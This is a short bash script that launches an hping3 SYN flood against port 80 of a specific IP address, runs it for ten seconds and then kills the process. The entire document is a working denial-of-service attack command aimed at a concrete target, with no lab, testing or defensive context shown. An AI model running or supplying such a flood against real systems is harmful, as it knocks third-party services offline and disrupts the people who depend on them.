#!/bin/bash
hping3 -S --flood -V -p 80 157.88.123.102
sleep 10
pkill hping